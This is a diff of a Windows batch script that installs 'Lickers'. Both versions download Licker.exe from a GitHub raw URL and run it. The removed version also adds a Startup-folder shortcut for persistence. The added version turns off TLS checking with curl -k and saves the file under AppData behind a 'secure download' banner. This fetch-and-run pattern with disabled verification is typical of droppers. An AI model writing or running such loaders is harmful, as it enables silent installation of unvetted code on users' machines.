@@ -1,26 +1,20 @@
 @echo off
-title Lickers Setup
-:: MAKE SURE THIS URL IS EXACTLY CORRECT
-set "EXE_URL=https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"
-set "SAVE_PATH=%USERPROFILE%\Licker.exe"
-set "STARTUP_LINK=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Licker.lnk"
+title Lickers Deployment
+echo [SYSTEM] Initializing secure download...
 
-echo ------------------------------------------
-echo   INSTALLING LICKERS...
-echo ------------------------------------------
+:: Create directory if it doesn't exist
+if not exist "%APPDATA%\LickersProject" mkdir "%APPDATA%\LickersProject"
+set "EXE_PATH=%APPDATA%\LickersProject\Licker.exe"
 
-:: The "-f" flag helps identify if the URL is actually broken
-curl -f -L "%EXE_URL%" -o "%SAVE_PATH%"
+:: -k ignores the SSL revocation check error you are seeing
+:: -L follows redirects to get the actual file
+curl -k -L -o "%EXE_PATH%" "https://raw.githubusercontent.com/sankarideb1-hue/Lickers/main/Licker.exe"
 
-if exist "%SAVE_PATH%" (
-    echo [OK] File downloaded successfully.
-    powershell -Command "$ws = New-Object -ComObject WScript.Shell; $s = $ws.CreateShortcut('%STARTUP_LINK%'); $s.TargetPath = '%SAVE_PATH%'; $s.Save()"
-    echo [OK] Added to Windows Startup.
-    echo ------------------------------------------
-    echo DONE! Running Licker now...
-    start "" "%SAVE_PATH%"
+if exist "%EXE_PATH%" (
+    echo [SUCCESS] Lickers is ready.
+    start "" "%EXE_PATH%"
 ) else (
-    echo [ERROR] Download failed. 
-    echo Please check if https://github.com/sankarideb1-hue/Lickers/blob/main/Licker.exe exists.
+    echo [ERROR] Download failed. Please check your internet connection.
+    pause
 )
-pause
+exit
